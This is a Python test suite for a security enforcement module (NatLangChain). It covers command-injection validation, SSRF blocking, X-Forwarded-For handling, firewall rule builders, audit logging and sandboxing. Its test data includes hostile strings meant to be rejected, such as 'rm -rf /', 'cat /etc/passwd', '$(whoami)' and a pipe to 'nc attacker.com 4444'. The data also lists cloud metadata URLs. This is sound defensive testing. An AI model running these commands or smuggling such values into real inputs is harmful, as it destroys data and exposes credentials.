#!/usr/bin/env python3
"""
Full Process and Feature Test for NatLangChain Security Enforcement.

This comprehensive test validates all security processes and features:
1. Module imports and initialization
2. Input validation (command injection prevention)
3. SSRF protection
4. X-Forwarded-For spoofing prevention
5. Fluent builder API
6. Context manager (temporary rules)
7. Exception mode (raise_on_failure)
8. Immutable audit logging
9. Mode enforcement (airgap, trusted, coldroom, lockdown)
10. USB enforcement
11. Process sandboxing
12. Daemon watchdog
"""

import sys
import os
import tempfile
import json
import inspect
from pathlib import Path

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

# Test counters
class TestResults:
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.skipped = 0
        self.sections = {}

    def add_pass(self, section, msg):
        print(f"  ✓ {msg}")
        self.passed += 1
        self.sections.setdefault(section, {"passed": 0, "failed": 0})
        self.sections[section]["passed"] += 1

    def add_fail(self, section, msg, error=None):
        print(f"  ✗ {msg}")
        if error:
            print(f"    Error: {error}")
        self.failed += 1
        self.sections.setdefault(section, {"passed": 0, "failed": 0})
        self.sections[section]["failed"] += 1

    def add_skip(self, section, msg, reason=None):
        print(f"  ⊘ {msg} (skipped)")
        if reason:
            print(f"    Reason: {reason}")
        self.skipped += 1

    def summary(self):
        print("\n" + "=" * 70)
        print("SECTION SUMMARY")
        print("=" * 70)
        for section, counts in self.sections.items():
            status = "✓" if counts["failed"] == 0 else "✗"
            print(f"  {status} {section}: {counts['passed']} passed, {counts['failed']} failed")

        print("\n" + "=" * 70)
        print("OVERALL RESULTS")
        print("=" * 70)
        total = self.passed + self.failed
        print(f"  Passed:  {self.passed}")
        print(f"  Failed:  {self.failed}")
        print(f"  Skipped: {self.skipped}")
        if total > 0:
            print(f"  Success Rate: {self.passed/total*100:.1f}%")

        if self.failed == 0:
            print("\n✓ ALL TESTS PASSED!")
            return 0
        else:
            print(f"\n✗ {self.failed} TESTS FAILED")
            return 1


results = TestResults()


def section(name):
    print(f"\n{'='*70}")
    print(f"[{name}]")
    print('='*70)


# =============================================================================
# TEST 1: Module Imports
# =============================================================================
def test_imports():
    section("1. MODULE IMPORTS")

    # Core security enforcement
    try:
        from security_enforcement import (
            NetworkEnforcement,
            USBEnforcement,
            ProcessSandbox,
            DaemonWatchdog,
            ImmutableAuditLog,
            EnforcementResult,
            EnforcementError,
            NetworkRuleBuilder,
            SecurityEnforcementManager,
            EnforcementCapability,
            validate_ip_address,
            validate_port,
            validate_interface_name,
            sanitize_log_prefix,
            enforce_boundary_mode,
        )
        results.add_pass("imports", "Core security_enforcement module")
        globals().update(locals())  # Make imports available globally
    except Exception as e:
        results.add_fail("imports", "Core security_enforcement module", str(e))
        return False

    # SSRF protection (standalone module)
    try:
        import importlib.util
        ssrf_path = os.path.join(os.path.dirname(__file__), 'src', 'api', 'ssrf_protection.py')
        spec = importlib.util.spec_from_file_location("ssrf_protection", ssrf_path)
        ssrf_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(ssrf_module)

        globals()['BLOCKED_IP_RANGES'] = ssrf_module.BLOCKED_IP_RANGES
        globals()['BLOCKED_HOSTS'] = ssrf_module.BLOCKED_HOSTS
        globals()['is_valid_ip'] = ssrf_module.is_valid_ip
        globals()['is_private_ip'] = ssrf_module.is_private_ip
        globals()['validate_url_for_ssrf'] = ssrf_module.validate_url_for_ssrf
        globals()['get_client_ip_from_headers'] = ssrf_module.get_client_ip_from_headers

        results.add_pass("imports", "SSRF protection module (standalone)")
    except Exception as e:
        results.add_fail("imports", "SSRF protection module", str(e))

    return True


# =============================================================================
# TEST 2: Input Validation (Command Injection Prevention)
# =============================================================================
def test_input_validation():
    section("2. INPUT VALIDATION (Command Injection Prevention)")

    # IP validation
    valid_ips = [
        ("192.168.1.1", "IPv4 private"),
        ("10.0.0.1", "IPv4 Class A"),
        ("8.8.8.8", "IPv4 public"),
        ("2001:db8::1", "IPv6"),
        ("::1", "IPv6 loopback"),
        ("fe80::1", "IPv6 link-local"),
    ]

    for ip, desc in valid_ips:
        is_valid, error = validate_ip_address(ip)
        if is_valid:
            results.add_pass("input_validation", f"IP valid: {desc} ({ip})")
        else:
            results.add_fail("input_validation", f"IP should be valid: {desc} ({ip})", error)

    injection_attempts = [
        ("192.168.1.1; rm -rf /", "semicolon injection"),
        ("10.0.0.1 && cat /etc/passwd", "command chaining"),
        ("8.8.8.8 | nc attacker.com 4444", "pipe injection"),
        ("$(whoami)", "command substitution $()"),
        ("`id`", "command substitution backticks"),
        ("192.168.1.1\n-A INPUT -j ACCEPT", "newline injection"),
        ("not-an-ip", "invalid format"),
        ("192.168.1.256", "invalid octet"),
        ("", "empty string"),
        ("   ", "whitespace only"),
        (None, "None value"),
    ]

    for ip, desc in injection_attempts:
        try:
            is_valid, error = validate_ip_address(ip)
            if not is_valid:
                results.add_pass("input_validation", f"IP rejected: {desc}")
            else:
                results.add_fail("input_validation", f"IP should be rejected: {desc}")
        except Exception:
            results.add_pass("input_validation", f"IP rejected (exception): {desc}")

    # Port validation
    valid_ports = [1, 22, 80, 443, 8080, 65535]
    for port in valid_ports:
        is_valid, error = validate_port(port)
        if is_valid:
            results.add_pass("input_validation", f"Port valid: {port}")
        else:
            results.add_fail("input_validation", f"Port should be valid: {port}", error)

    invalid_ports = [0, -1, 65536, 99999, "80; rm -rf /"]
    for port in invalid_ports:
        is_valid, error = validate_port(port)
        if not is_valid:
            results.add_pass("input_validation", f"Port rejected: {port}")
        else:
            results.add_fail("input_validation", f"Port should be rejected: {port}")

    # None is valid (optional port)
    is_valid, error = validate_port(None)
    if is_valid:
        results.add_pass("input_validation", "Port accepts None (optional)")
    else:
        results.add_fail("input_validation", "Port should accept None (optional)")

    # Interface validation
    valid_interfaces = ["eth0", "lo", "wlan0", "enp0s3", "docker0", "br-123abc"]
    for iface in valid_interfaces:
        is_valid, error = validate_interface_name(iface)
        if is_valid:
            results.add_pass("input_validation", f"Interface valid: {iface}")
        else:
            results.add_fail("input_validation", f"Interface should be valid: {iface}", error)

    invalid_interfaces = [
        "eth0; rm -rf /",
        "$(whoami)",
        "../../etc/passwd",
        "eth 0",
        "",
    ]
    for iface in invalid_interfaces:
        is_valid, error = validate_interface_name(iface)
        if not is_valid:
            results.add_pass("input_validation", f"Interface rejected: {repr(iface)}")
        else:
            results.add_fail("input_validation", f"Interface should be rejected: {repr(iface)}")

    # Log prefix sanitization
    # sanitize_log_prefix removes non-alphanumeric (except _) and limits to 20 chars
    prefixes = [
        ("MYLOG", "MYLOG", "normal prefix"),
        ("test; rm -rf /", "testrmrf", "injection attempt"),  # strips special chars
        ("log$(id)", "logid", "command substitution"),  # strips $()
        ("a" * 100, "a" * 20, "length limit (20 chars)"),  # limits to 20
        ("test_prefix_123", "test_prefix_123", "underscore allowed"),
    ]
    for input_prefix, expected, desc in prefixes:
        sanitized = sanitize_log_prefix(input_prefix)
        if sanitized == expected:
            results.add_pass("input_validation", f"Log prefix sanitized: {desc}")
        else:
            results.add_fail("input_validation", f"Log prefix: expected '{expected}', got '{sanitized}'")


# =============================================================================
# TEST 3: SSRF Protection
# =============================================================================
def test_ssrf_protection():
    section("3. SSRF PROTECTION")

    # Check blocked ranges exist
    if len(BLOCKED_IP_RANGES) >= 15:
        results.add_pass("ssrf", f"BLOCKED_IP_RANGES has {len(BLOCKED_IP_RANGES)} ranges")
    else:
        results.add_fail("ssrf", f"BLOCKED_IP_RANGES should have 15+ ranges, has {len(BLOCKED_IP_RANGES)}")

    if len(BLOCKED_HOSTS) >= 10:
        results.add_pass("ssrf", f"BLOCKED_HOSTS has {len(BLOCKED_HOSTS)} hosts")
    else:
        results.add_fail("ssrf", f"BLOCKED_HOSTS should have 10+ hosts, has {len(BLOCKED_HOSTS)}")

    # Test private IP detection
    private_ips = [
        ("192.168.1.1", True, "Private Class C"),
        ("10.0.0.1", True, "Private Class A"),
        ("172.16.0.1", True, "Private Class B"),
        ("127.0.0.1", True, "Localhost"),
        ("169.254.169.254", True, "AWS metadata"),
        ("8.8.8.8", False, "Google DNS (public)"),
        ("1.1.1.1", False, "Cloudflare DNS (public)"),
    ]

    for ip, should_be_private, desc in private_ips:
        result = is_private_ip(ip)
        if result == should_be_private:
            results.add_pass("ssrf", f"is_private_ip: {desc}")
        else:
            results.add_fail("ssrf", f"is_private_ip wrong for {desc}: expected {should_be_private}")

    # Test URL validation
    blocked_urls = [
        ("http://localhost/admin", "localhost"),
        ("http://127.0.0.1/secret", "loopback IP"),
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
        ("http://metadata.google.internal/computeMetadata/", "GCP metadata"),
        ("http://192.168.1.1/admin", "private IP"),
        ("http://10.0.0.1/internal", "private Class A"),
        ("ftp://example.com/file", "non-HTTP scheme"),
    ]

    for url, desc in blocked_urls:
        is_safe, error = validate_url_for_ssrf(url)
        if not is_safe:
            results.add_pass("ssrf", f"URL blocked: {desc}")
        else:
            results.add_fail("ssrf", f"URL should be blocked: {desc}")


# =============================================================================
# TEST 4: X-Forwarded-For Protection
# =============================================================================
def test_xff_protection():
    section("4. X-FORWARDED-FOR PROTECTION")

    # Test 1: No trusted proxies - should use remote_addr
    result = get_client_ip_from_headers(
        remote_addr="1.2.3.4",
        xff_header="5.6.7.8, 9.10.11.12",
        trusted_proxies=set()
    )
    if result == "1.2.3.4":
        results.add_pass("xff", "No trusted proxies: uses remote_addr")
    else:
        results.add_fail("xff", f"No trusted proxies: expected '1.2.3.4', got '{result}'")

    # Test 2: With trusted proxy - uses rightmost non-proxy IP
    result = get_client_ip_from_headers(
        remote_addr="10.0.0.1",
        xff_header="5.6.7.8, 9.10.11.12, 10.0.0.2",
        trusted_proxies={"10.0.0.1", "10.0.0.2"}
    )
    if result == "9.10.11.12":
        results.add_pass("xff", "Trusted proxy: uses rightmost non-proxy IP")
    else:
        results.add_fail("xff", f"Trusted proxy: expected '9.10.11.12', got '{result}'")

    # Test 3: Spoofing attempt with invalid IP
    result = get_client_ip_from_headers(
        remote_addr="10.0.0.1",
        xff_header="not-an-ip, 5.6.7.8",
        trusted_proxies={"10.0.0.1"}
    )
    if result == "5.6.7.8":
        results.add_pass("xff", "Spoofing attempt: skips invalid IPs")
    else:
        results.add_fail("xff", f"Spoofing: expected '5.6.7.8', got '{result}'")

    # Test 4: All proxies trusted
    result = get_client_ip_from_headers(
        remote_addr="10.0.0.1",
        xff_header="10.0.0.2, 10.0.0.3",
        trusted_proxies={"10.0.0.1", "10.0.0.2", "10.0.0.3"}
    )
    if result == "10.0.0.2":
        results.add_pass("xff", "All trusted: uses leftmost IP")
    else:
        results.add_fail("xff", f"All trusted: expected '10.0.0.2', got '{result}'")

    # Test 5: Empty XFF header
    result = get_client_ip_from_headers(
        remote_addr="1.2.3.4",
        xff_header=None,
        trusted_proxies={"10.0.0.1"}
    )
    if result == "1.2.3.4":
        results.add_pass("xff", "Empty XFF: uses remote_addr")
    else:
        results.add_fail("xff", f"Empty XFF: expected '1.2.3.4', got '{result}'")


# =============================================================================
# TEST 5: Fluent Builder API
# =============================================================================
def test_builder_api():
    section("5. FLUENT BUILDER API")

    net = NetworkEnforcement()

    # Test builder creation
    builder = net.rule()
    if isinstance(builder, NetworkRuleBuilder):
        results.add_pass("builder", "rule() returns NetworkRuleBuilder")
    else:
        results.add_fail("builder", f"rule() should return NetworkRuleBuilder, got {type(builder)}")

    # Test chainable methods
    try:
        chain = net.rule().block().destination("8.8.8.8").port(443)
        if hasattr(chain, 'apply'):
            results.add_pass("builder", "Methods are chainable")
        else:
            results.add_fail("builder", "Chain missing apply() method")
    except Exception as e:
        results.add_fail("builder", "Method chaining failed", str(e))

    # Test all builder methods exist
    methods = ['block', 'allow', 'inbound', 'outbound', 'destination', 'source', 'port', 'protocol', 'apply']
    for method in methods:
        if hasattr(NetworkRuleBuilder, method):
            results.add_pass("builder", f"Method exists: {method}()")
        else:
            results.add_fail("builder", f"Missing method: {method}()")

    # Test validation in builder
    result = net.rule().block().destination("invalid-ip").apply()
    if not result.success and "Invalid" in str(result.error):
        results.add_pass("builder", "Validates IP addresses")
    else:
        results.add_fail("builder", "Should reject invalid IP")

    # Test missing action
    result = net.rule().destination("8.8.8.8").apply()
    if not result.success and "block()" in str(result.error):
        results.add_pass("builder", "Requires action (block/allow)")
    else:
        results.add_fail("builder", "Should require action")

    # Test raise_on_failure parameter
    sig = inspect.signature(NetworkRuleBuilder.apply)
    if 'raise_on_failure' in sig.parameters:
        results.add_pass("builder", "apply() has raise_on_failure parameter")
    else:
        results.add_fail("builder", "apply() missing raise_on_failure parameter")


# =============================================================================
# TEST 6: Context Manager
# =============================================================================
def test_context_manager():
    section("6. CONTEXT MANAGER (Temporary Rules)")

    net = NetworkEnforcement()

    # Check method exists
    if hasattr(net, 'temporary_block'):
        results.add_pass("context", "temporary_block method exists")
    else:
        results.add_fail("context", "temporary_block method missing")
        return

    # Check it's a context manager
    cm = net.temporary_block("8.8.8.8", 443)
    if hasattr(cm, '__enter__') and hasattr(cm, '__exit__'):
        results.add_pass("context", "temporary_block is a context manager")
    else:
        results.add_fail("context", "temporary_block not a context manager")

    # Test signature
    sig = inspect.signature(net.temporary_block)
    params = list(sig.parameters.keys())
    if 'ip' in params and 'port' in params:
        results.add_pass("context", "Has ip and port parameters")
    else:
        results.add_fail("context", f"Wrong parameters: {params}")


# =============================================================================
# TEST 7: Exception Mode
# =============================================================================
def test_exception_mode():
    section("7. EXCEPTION MODE (raise_on_failure)")

    # Test EnforcementError
    try:
        result = EnforcementResult(success=False, action="test", error="test error")
        err = EnforcementError(result)
        if "test error" in str(err):
            results.add_pass("exception", "EnforcementError contains message")
        else:
            results.add_fail("exception", "EnforcementError missing message")

        if err.result == result:
            results.add_pass("exception", "EnforcementError has result attribute")
        else:
            results.add_fail("exception", "EnforcementError missing result")
    except Exception as e:
        results.add_fail("exception", "EnforcementError creation", str(e))

    # Test raise_on_failure in high-level modes
    manager = SecurityEnforcementManager()
    for method_name in ['enforce_airgap_mode', 'enforce_trusted_mode', 'enforce_coldroom_mode', 'enforce_lockdown_mode']:
        method = getattr(manager, method_name)
        sig = inspect.signature(method)
        if 'raise_on_failure' in sig.parameters:
            results.add_pass("exception", f"{method_name} has raise_on_failure")
        else:
            results.add_fail("exception", f"{method_name} missing raise_on_failure")


# =============================================================================
# TEST 8: Immutable Audit Log
# =============================================================================
def test_audit_log():
    section("8. IMMUTABLE AUDIT LOG")

    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        log_file = f.name

    try:
        log = ImmutableAuditLog(log_file)

        # Test append
        result = log.append("test_event", {"key": "value", "number": 42})
        if result.success:
            results.add_pass("audit", "append() succeeds")
        else:
            results.add_fail("audit", "append() failed", result.error)

        # Test multiple entries
        log.append("second_event", {"data": "test"})
        log.append("third_event", {"data": "more"})

        # Test integrity verification
        if log.verify_integrity():
            results.add_pass("audit", "verify_integrity() passes")
        else:
            results.add_fail("audit", "verify_integrity() failed")

        # Test hash chain exists
        if len(log._hash_chain) >= 3:
            results.add_pass("audit", f"Hash chain has {len(log._hash_chain)} entries")
        else:
            results.add_fail("audit", f"Hash chain too short: {len(log._hash_chain)}")

        # Test file was written
        if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
            results.add_pass("audit", "Log file created with content")
        else:
            results.add_fail("audit", "Log file empty or missing")

        # Test log format (JSON lines)
        with open(log_file, 'r') as f:
            lines = f.readlines()
            if len(lines) >= 3:
                try:
                    for line in lines:
                        entry = json.loads(line)
                        if 'timestamp' in entry and 'event_type' in entry and 'hash' in entry:
                            pass
                        else:
                            raise ValueError("Missing fields")
                    results.add_pass("audit", "Log entries have required fields")
                except Exception as e:
                    results.add_fail("audit", "Log format invalid", str(e))
            else:
                results.add_fail("audit", f"Expected 3+ log lines, got {len(lines)}")

    except Exception as e:
        results.add_fail("audit", "Audit log test error", str(e))
    finally:
        if os.path.exists(log_file):
            os.unlink(log_file)


# =============================================================================
# TEST 9: Mode Enforcement
# =============================================================================
def test_mode_enforcement():
    section("9. MODE ENFORCEMENT")

    manager = SecurityEnforcementManager()

    # Test capabilities detection
    caps = manager._get_available_enforcement()
    results.add_pass("modes", f"Detected enforcement: {caps}")

    # Test mode methods exist
    modes = [
        ('enforce_airgap_mode', 'AIRGAP'),
        ('enforce_trusted_mode', 'TRUSTED'),
        ('enforce_coldroom_mode', 'COLDROOM'),
        ('enforce_lockdown_mode', 'LOCKDOWN'),
        ('exit_lockdown', 'EXIT'),
    ]

    for method_name, mode_name in modes:
        if hasattr(manager, method_name):
            results.add_pass("modes", f"Mode method exists: {method_name}")
        else:
            results.add_fail("modes", f"Mode method missing: {method_name}")

    # Test enforce_boundary_mode helper
    for mode in ['AIRGAP', 'TRUSTED', 'COLDROOM', 'LOCKDOWN', 'OPEN']:
        result = enforce_boundary_mode(mode)
        # We expect these to fail (no iptables) but the function should exist
        if isinstance(result, EnforcementResult):
            results.add_pass("modes", f"enforce_boundary_mode('{mode}') returns EnforcementResult")
        else:
            results.add_fail("modes", f"enforce_boundary_mode('{mode}') wrong return type")

    # Test unknown mode
    result = enforce_boundary_mode("INVALID_MODE")
    if not result.success and "Unknown" in str(result.error):
        results.add_pass("modes", "Unknown mode rejected")
    else:
        results.add_fail("modes", "Should reject unknown mode")


# =============================================================================
# TEST 10: USB Enforcement
# =============================================================================
def test_usb_enforcement():
    section("10. USB ENFORCEMENT")

    usb = USBEnforcement()

    # Test core methods exist
    methods = ['block_usb_storage', 'allow_usb_storage']
    for method in methods:
        if hasattr(usb, method):
            results.add_pass("usb", f"Method exists: {method}()")
        else:
            results.add_fail("usb", f"Method missing: {method}()")

    # Test class attributes
    if hasattr(USBEnforcement, 'UDEV_RULES_PATH'):
        results.add_pass("usb", "Has UDEV_RULES_PATH class attribute")
    else:
        results.add_fail("usb", "Missing UDEV_RULES_PATH attribute")

    # Test methods return EnforcementResult
    result = usb.block_usb_storage()
    if isinstance(result, EnforcementResult):
        results.add_pass("usb", "block_usb_storage() returns EnforcementResult")
    else:
        results.add_fail("usb", "Wrong return type from block_usb_storage()")


# =============================================================================
# TEST 11: Process Sandbox
# =============================================================================
def test_process_sandbox():
    section("11. PROCESS SANDBOX")

    sandbox = ProcessSandbox()

    # Test methods exist
    if hasattr(sandbox, 'enter_sandbox'):
        results.add_pass("sandbox", "Method exists: enter_sandbox()")
    else:
        results.add_fail("sandbox", "Method missing: enter_sandbox()")

    if hasattr(sandbox, 'run_sandboxed'):
        results.add_pass("sandbox", "Method exists: run_sandboxed()")
    else:
        results.add_fail("sandbox", "Method missing: run_sandboxed()")

    # Test capability detection
    for cap in ['seccomp_available', 'namespaces_available']:
        if hasattr(sandbox, cap):
            results.add_pass("sandbox", f"Has {cap} attribute")
        else:
            results.add_fail("sandbox", f"Missing {cap} attribute")

    # Test ALLOWED_SYSCALLS_MINIMAL class attribute
    if hasattr(ProcessSandbox, 'ALLOWED_SYSCALLS_MINIMAL'):
        syscalls = ProcessSandbox.ALLOWED_SYSCALLS_MINIMAL
        if len(syscalls) > 10:
            results.add_pass("sandbox", f"Has ALLOWED_SYSCALLS_MINIMAL ({len(syscalls)} syscalls)")
        else:
            results.add_fail("sandbox", "ALLOWED_SYSCALLS_MINIMAL too short")
    else:
        results.add_fail("sandbox", "Missing ALLOWED_SYSCALLS_MINIMAL")


# =============================================================================
# TEST 12: Daemon Watchdog
# =============================================================================
def test_watchdog():
    section("12. DAEMON WATCHDOG")

    watchdog = DaemonWatchdog()

    # Test methods exist
    methods = ['start', 'stop']
    for method in methods:
        if hasattr(watchdog, method):
            results.add_pass("watchdog", f"Method exists: {method}()")
        else:
            results.add_fail("watchdog", f"Method missing: {method}()")

    # Test internal state tracking
    if hasattr(watchdog, '_running'):
        results.add_pass("watchdog", "Has _running state")
    else:
        results.add_fail("watchdog", "Missing _running state")

    # Test initial state is not running
    if watchdog._running == False:
        results.add_pass("watchdog", "Initial state is not running")
    else:
        results.add_fail("watchdog", "Should start in non-running state")

    # Test start returns EnforcementResult
    result = watchdog.start()
    if isinstance(result, EnforcementResult):
        results.add_pass("watchdog", "start() returns EnforcementResult")
    else:
        results.add_fail("watchdog", f"start() should return EnforcementResult")

    # Stop the watchdog
    watchdog.stop()


# =============================================================================
# TEST 13: NetworkEnforcement Methods
# =============================================================================
def test_network_enforcement():
    section("13. NETWORK ENFORCEMENT METHODS")

    net = NetworkEnforcement()

    # Core methods
    core_methods = [
        'block_all_outbound',
        'block_destination',
        'allow_only_vpn',
        'clear_rules',
    ]
    for method in core_methods:
        if hasattr(net, method):
            results.add_pass("network", f"Core method exists: {method}()")
        else:
            results.add_fail("network", f"Core method missing: {method}()")

    # Extended admin methods
    admin_methods = [
        'allowlist_only',
        'block_inbound',
        'rate_limit_outbound',
        'log_connections',
        'get_active_rules',
    ]
    for method in admin_methods:
        if hasattr(net, method):
            results.add_pass("network", f"Admin method exists: {method}()")
        else:
            results.add_fail("network", f"Admin method missing: {method}()")

    # Test validation in methods (should fail gracefully with invalid input)
    result = net.block_destination("invalid; rm -rf /")
    if not result.success and "Invalid" in str(result.error):
        results.add_pass("network", "block_destination validates input")
    else:
        results.add_fail("network", "block_destination should validate input")

    # Test allowlist validation
    result = net.allowlist_only(["192.168.1.1; evil", "10.0.0.1"])
    if not result.success and "Invalid" in str(result.error):
        results.add_pass("network", "allowlist_only validates IPs")
    else:
        results.add_fail("network", "allowlist_only should validate IPs")


# =============================================================================
# TEST 14: EnforcementResult Structure
# =============================================================================
def test_enforcement_result():
    section("14. ENFORCEMENT RESULT STRUCTURE")

    # Test successful result
    result = EnforcementResult(
        success=True,
        action="test_action",
        details={"key": "value"}
    )

    if result.success == True:
        results.add_pass("result", "success attribute works")
    else:
        results.add_fail("result", "success attribute wrong")

    if result.action == "test_action":
        results.add_pass("result", "action attribute works")
    else:
        results.add_fail("result", "action attribute wrong")

    if result.details == {"key": "value"}:
        results.add_pass("result", "details attribute works")
    else:
        results.add_fail("result", "details attribute wrong")

    # Test failed result
    result = EnforcementResult(
        success=False,
        action="failed_action",
        error="Something went wrong"
    )

    if result.error == "Something went wrong":
        results.add_pass("result", "error attribute works")
    else:
        results.add_fail("result", "error attribute wrong")


# =============================================================================
# Main
# =============================================================================
def main():
    print("=" * 70)
    print("NatLangChain Security Enforcement - Full Process & Feature Test")
    print("=" * 70)

    # Run import tests first (required for other tests)
    if not test_imports():
        print("\n✗ CRITICAL: Import tests failed, cannot continue")
        return 1

    # Run all other tests
    test_input_validation()
    test_ssrf_protection()
    test_xff_protection()
    test_builder_api()
    test_context_manager()
    test_exception_mode()
    test_audit_log()
    test_mode_enforcement()
    test_usb_enforcement()
    test_process_sandbox()
    test_watchdog()
    test_network_enforcement()
    test_enforcement_result()

    return results.summary()


if __name__ == "__main__":
    sys.exit(main())
